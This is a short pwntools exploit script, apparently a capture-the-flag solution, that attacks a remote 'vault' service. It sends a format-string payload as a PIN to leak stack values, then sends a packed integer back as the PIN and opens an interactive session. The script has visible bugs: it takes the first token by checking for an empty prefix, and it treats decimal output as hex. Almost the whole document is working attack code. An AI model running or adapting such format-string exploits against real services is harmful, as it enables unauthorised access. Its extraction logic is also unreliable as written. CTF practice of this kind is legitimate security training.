from pwn import *

io = remote('itemize-c96a-vault.ept.gg', 1337, ssl=True)
io.sendlineafter(b"Enter your choice:",b"1")
io.sendlineafter(b"Enter your PIN to access the vault:",b"%d %d %d %d %d %d")

a = (io.recvline())
decoded_string = a.decode('utf-8')  # Decode the byte string to a regular string
print(a)
# Extract the hexadecimal part
# We'll split by spaces and look for the segment that starts with '0x'
parts = decoded_string.split()
hex_string = None

for part in parts:
    if part.startswith(''):
        hex_string = part
        break

# Print the result
if hex_string:
    print(f"Extracted Hex: {hex_string}")
else:
    print("No hex string found.")


io.sendlineafter(b"Enter your choice:",b"1")
io.sendlineafter(b"Enter your PIN to access the vault:",p32(int(hex_string,16)))
io.interactive()
io.close()